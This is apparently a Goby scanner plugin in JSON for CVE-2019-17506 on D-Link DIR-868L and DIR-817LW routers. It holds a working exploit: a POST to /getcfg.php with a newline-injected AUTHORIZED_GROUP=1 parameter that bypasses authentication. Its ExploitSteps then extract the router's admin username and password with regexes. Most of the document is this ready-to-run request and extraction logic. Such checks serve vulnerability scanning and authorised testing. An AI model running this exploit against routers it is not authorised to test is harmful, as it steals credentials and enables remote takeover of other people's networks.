{
      "Name": "D-LINK DIR-868L x DIR-817LW Info Leak CVE-2019-17506",
      "Level": "3",
      "Tags": [
            "infoleak"
      ],
      "GobyQuery": "app=\"DLink-Wireless-Router\"",
      "Description": "D-Link is a global leader in designing and developing networking and connectivity products for consumers, small businesses, medium to large-sized enterprises, and service providers.",
      "Product": "D-Link DIR-868L",
      "Homepage": "https://www.dlink.com/",
      "Author": "",
      "Impact": "There are some web interfaces without authentication requirements on D-Link DIR-868L B1-2.03 and DIR-817LW A1-1.04 routers. An attacker can get the router's username and password (and other information) via a DEVICE.ACCOUNT value for SERVICES in conjunction with AUTHORIZED_GROUP=1%0a to getcfg.php. This could be used to control the router remotely.",
      "Recommendation": "Hide account passwords or encrypt account passwords.",
      "References": [
            "https://nvd.nist.gov/vuln/detail/CVE-2019-17506"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/getcfg.php",
                        "follow_redirect": true,
                        "header": {
                              "Content-Type": "application/x-www-form-urlencoded"
                        },
                        "data_type": "text",
                        "data": "SERVICES=DEVICE.ACCOUNT&attack=ture\r\nAUTHORIZED_GROUP=1",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "name",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "password",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "DEVICE.ACCOUNT",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/getcfg.php",
                        "follow_redirect": true,
                        "header": {
                              "Content-Type": "application/x-www-form-urlencoded"
                        },
                        "data_type": "text",
                        "data": "SERVICES=DEVICE.ACCOUNT&attack=ture\r\nAUTHORIZED_GROUP=1",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "DEVICE.ACCOUNT",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "name",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "password",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "username|lastbody|regex|<name>(.*)</name>",
                        "password|lastbody|regex|<password>(.*)</password>",
                        "output|define|text|Username:{{{username}}}"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}